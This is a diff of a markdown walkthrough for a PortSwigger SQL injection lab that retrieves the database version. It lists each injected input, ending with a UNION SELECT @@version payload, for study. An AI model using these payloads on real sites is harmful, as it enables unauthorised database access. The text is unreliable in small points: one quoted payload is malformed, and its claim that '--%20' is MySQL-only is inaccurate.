@@ -7,32 +7,32 @@ This lab contains a SQL injection vulnerability in the product category filter. 
 
 **Lab Link** >> https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
 
-# Navigate to
-/filter?category=Lifestyle
+*Navigate to*
+* /filter?category=Lifestyle
 
-# Test input 
-category=Lifestyle'
->>> Internal server error → confirm injection point
+* Test input* 
+* category=Lifestyle'
+    → Internal server error → confirm injection point
 
-# Bypass Query using comment
-category=Lifestyle'--
->>> Internal server error.
-category=Lifestyle'--%20
->>> Successful execution → Confirms MYSQL database (--%20 is the comment used only in mysql database. here %20 is url encoded form of <space button>)
+*Bypass Query using comment*
+* category=Lifestyle'--
+    → Internal server error.
+* category=Lifestyle'--%20
+    → Successful execution → Confirms MYSQL database (--%20 is the comment used only in mysql database. here %20 is url encoded form of <space button>)
 
-# Determine number of columns
-category=Lifestyle' order by 2 --%20
->>> Successful execution
-category=Lifestyle' order by 3 --%20
->>> Error → Confirms 2 columns
+*Determine number of columns*
+* category=Lifestyle' order by 2 --%20
+    → Successful execution
+* category=Lifestyle' order by 3 --%20
+    → Error → Confirms 2 columns
 
-# Identify string competibility
-category=' union select 'test,'test' --%20
->>> Successful execution
+*Identify string competibility*
+* category=' union select 'test,'test' --%20
+    → Successful execution
 
-# Retrive Database version
-category=' union select null,@@version --%20
->>> Successful execution → Lab solved.
+*Retrive Database version*
+* category=' union select null,@@version --%20
+    → Successful execution → Lab solved.
 
 # Payload used
 ' union select null,@@version --%20
